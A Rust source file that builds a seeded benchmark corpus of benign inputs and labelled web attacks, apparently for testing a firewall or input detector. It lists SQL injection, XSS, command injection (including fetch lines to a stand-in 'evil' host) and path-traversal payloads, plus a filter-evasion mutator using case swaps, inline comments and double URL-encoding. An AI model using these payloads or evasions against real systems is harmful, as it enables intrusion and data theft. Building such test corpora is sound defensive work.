//! Deterministic benchmark corpus generator. Produces three labeled sets:
//! benign, attack (plain), and obfuscated (mutated attacks), using a small
//! xorshift PRNG so runs are reproducible from a seed.

use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Sample {
    pub value: String,
    /// true = attack, false = benign.
    pub attack: bool,
    pub kind: String,
}

struct Rng(u64);
impl Rng {
    fn next(&mut self) -> u64 {
        let mut x = self.0;
        x ^= x << 13;
        x ^= x >> 7;
        x ^= x << 17;
        self.0 = x;
        x
    }
    fn pick<'a, T>(&mut self, xs: &'a [T]) -> &'a T {
        &xs[(self.next() as usize) % xs.len()]
    }
    fn chance(&mut self, pct: u64) -> bool {
        self.next() % 100 < pct
    }
}

const BENIGN: &[&str] = &[
    "best coffee in brisbane",
    "user@example.com",
    "order #12345 shipped",
    "The quick brown fox jumps over the lazy dog",
    "price is 19.99 AUD",
    "select your preferred language",
    "I think 1 plus 1 = 2 in my notes",
    "C:/Users/dennis/Documents/report.pdf",
    "https://example.com/path?page=2&sort=asc",
    "a & b are friends",
    "comment: this product is great; i love it",
    "SELECT in SQL is a keyword we teach in class",
    "name=O'Brien",
    "math: is 2>1 true? yes",
    "search term with <brackets> but not a tag",
    "the union of two sets",
    "path/to/my/file.txt",
    "hello world",
    "温度是 25 度",
    "café résumé naïve",
];

const BENIGN_NAMES: &[&str] = &["q", "search", "name", "comment", "page", "sort", "lang", "id"];

const SQLI: &[&str] = &[
    "1 union select username,password from users",
    "admin' or 1=1--",
    "' or 'a'='a",
    "1; drop table users",
    "1 and (select sleep(5))",
    "-1 union all select null,version()--",
    "' or 1=1 limit 1 -- ",
    "1' and extractvalue(1,concat(0x7e,version()))--",
    "x' union select table_name from information_schema.tables--",
];
const XSS: &[&str] = &[
    "<script>alert(1)</script>",
    "<svg onload=alert(document.cookie)>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
    "\"><script>alert(String.fromCharCode(88))</script>",
];
const CMDI: &[&str] = &[
    "127.0.0.1; cat /etc/passwd",
    "foo | whoami",
    "`id`",
    "$(curl http://evil/x)",
    "x && wget http://evil/sh",
];
const TRAV: &[&str] = &[
    "../../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "....//....//etc/shadow",
    "/var/www/../../etc/passwd",
];
const ATTACK_NAMES: &[&str] = &["id", "q", "name", "file", "path", "cmd", "search"];

fn all_attacks() -> Vec<(&'static str, &'static str)> {
    let mut v = Vec::new();
    for s in SQLI {
        v.push(("sqli", *s));
    }
    for s in XSS {
        v.push(("xss", *s));
    }
    for s in CMDI {
        v.push(("cmdi", *s));
    }
    for s in TRAV {
        v.push(("traversal", *s));
    }
    v
}

/// Apply a semantics-preserving mutation (the obfuscations described in the
/// WAF-A-MoLE evasion literature): case swap, inline comments, whitespace swap,
/// and single/double URL-encoding.
fn mutate(rng: &mut Rng, s: &str) -> String {
    let mut out = s.to_string();
    if rng.chance(60) {
        // case swap
        out = out
            .chars()
            .map(|c| {
                if rng.chance(50) {
                    c.to_ascii_uppercase()
                } else {
                    c.to_ascii_lowercase()
                }
            })
            .collect();
    }
    if rng.chance(50) && out.to_lowercase().contains(' ') {
        out = out.replace(' ', "/**/");
    }
    if rng.chance(50) {
        out = url_encode(&out);
        if rng.chance(40) {
            out = url_encode(&out); // double-encode
        }
    }
    out
}

fn url_encode(s: &str) -> String {
    let mut out = String::with_capacity(s.len() * 3);
    for b in s.bytes() {
        if b.is_ascii_alphanumeric() {
            out.push(b as char);
        } else {
            out.push('%');
            out.push_str(&format!("{b:02X}"));
        }
    }
    out
}

/// Generate `n_each` of benign, attack, obfuscated samples.
pub fn generate(seed: u64, n_each: usize) -> Vec<Sample> {
    let mut rng = Rng(seed | 1);
    let attacks = all_attacks();
    let mut out = Vec::with_capacity(n_each * 3);

    for _ in 0..n_each {
        let v = rng.pick(BENIGN);
        let _name = rng.pick(BENIGN_NAMES);
        out.push(Sample {
            value: v.to_string(),
            attack: false,
            kind: "benign".into(),
        });
    }
    for _ in 0..n_each {
        let (k, v) = *rng.pick(&attacks);
        let _name = rng.pick(ATTACK_NAMES);
        out.push(Sample {
            value: v.to_string(),
            attack: true,
            kind: format!("attack-{k}"),
        });
    }
    for _ in 0..n_each {
        let (k, v) = *rng.pick(&attacks);
        out.push(Sample {
            value: mutate(&mut rng, v),
            attack: true,
            kind: format!("obfuscated-{k}"),
        });
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn deterministic() {
        let a = generate(42, 10);
        let b = generate(42, 10);
        assert_eq!(a.len(), b.len());
        assert_eq!(a[5].value, b[5].value);
        assert_eq!(a.len(), 30);
    }

    #[test]
    fn labels_balanced() {
        let s = generate(1, 100);
        assert_eq!(s.iter().filter(|x| !x.attack).count(), 100);
        assert_eq!(s.iter().filter(|x| x.attack).count(), 200);
    }
}
